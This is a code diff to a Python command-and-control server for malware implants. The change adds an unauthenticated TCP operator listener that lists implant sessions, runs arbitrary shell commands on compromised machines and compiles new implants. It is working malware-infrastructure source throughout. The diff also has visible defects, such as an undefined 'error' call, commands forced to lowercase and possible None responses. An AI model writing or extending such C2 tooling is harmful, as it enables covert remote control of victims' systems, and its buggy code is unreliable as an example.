@@ -4,13 +4,17 @@ import logging
 import sys
 
 
-from mtls import mtls, clienthandler
+from mtls import mtls
 from generate.generate import generate
 from queue import Queue
 from handler.handler import Handler
 
+import socket
+import threading
+import uuid
 
 class C2Server(object):
+    connections = []
 
     def __init__(self):
         ## Generating stuff for implant comms ##
@@ -21,10 +25,21 @@ class C2Server(object):
         self.handler = Handler(self.requestq)
         self.handler.start()
         print("Listening for implants...")
-        self.operatorlistener = clienthandler.Listener()
         print("Listening for operators...")
 
         self.shutdown = 0
+
+
+        # operator listener setup
+        self.clients = dict()
+
+        self.host = ''
+        self.port = 12345
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.bind((self.host, self.port))
+        threading.Thread(target=self.listen).start() #this is so we can listen and have execute commands from server console
+
 
     def serverMain(self):
         while self.shutdown == 0:
@@ -38,8 +53,9 @@ class C2Server(object):
             conn, addr = self.implantlistener.sessions.get(session_id) 
             print(f"Using session with {addr}")
 
-            ###sys.stdout.buffer.write(mtls.session(conn, command)) # uncomment once operator works 
+            return mtls.session(conn, command) # uncomment once operator works 
 
+            '''
             ###temporary shell -- to be removed once operator works
             while True:
                 userin = input("[session] > ") 
@@ -53,25 +69,23 @@ class C2Server(object):
                     break
 
                 sys.stdout.buffer.write(output) 
+            '''
 
     def executecommand(self, command):
-        print("DEBUG: IN_EXECUTECOMMAND with command:", command)
-
         #command is an array of strings
         if len(command) < 1:
-            print("Invalid Command")
-            return("Invalid Command")
+            return
 
         elif command[0] == "sessions":
-            for id in self.implantlistener.sessions.list():
-                print(id)
+            return str(self.implantlistener.sessions.list()).encode('ascii')
 
         # Interact with a session
-        elif command[0] == "use":
-            if len(command) == 2:
-                self.executecommand_session(command[1], 'whoami') # TODO change whoami to operator command once it works
+        elif command[0] == "run":
+            if len(command) == 3:
+                response = self.executecommand_session(command[1], command[2]) # TODO change whoami to operator command once it works
+                return response
             else:
-                print("Usage: use <session>")
+                return(b"Usage: run <session> <cmd>")
 
         # Compile an implant
         elif command[0] == "generate":
@@ -79,8 +93,40 @@ class C2Server(object):
             generate(self.implantlistener.client_certs)
 
         else:
-            print("Unknown Command")
-            return("Unknown Command")
+            return(b"Unknown Command")
+
+    def listen(self):
+        numberOfUsers = 5
+        self.sock.listen(numberOfUsers)
+        while True: #keep listening, start a new thread when a client connects
+            client, address = self.sock.accept()
+
+            id = str(uuid.uuid4())
+            self.clients[id] = (client, address)
+
+            print("###### client: ", client)
+            print("###### address: ", address)
+    
+
+            print("\n[+]Connected to a new client at " + address[0] + ":" + str(address[1]) + "\n")
+            #client.settimeout(60)
+            t = threading.Thread(target = self.listenToClient,args = (client,address)).start()
+            self.connections.append(address) #dont know why to do this, just seems right?
+
+    def listenToClient(self, client, address):
+        size = 1024
+        while True:
+            data = client.recv(size)
+            if data and (str(data.decode('ascii')).lower() != 'exit'):
+                recvData = str(data.decode('ascii')).lower()
+                print("RECIVED: " + recvData)
+
+                response = self.executecommand(recvData.split())
+
+                client.send(response)
+            else:
+                print("[+]Disconnected " + address[0] +":"+ str(address[1]))
+                raise error('Client disconnected')
 
 
 def main():
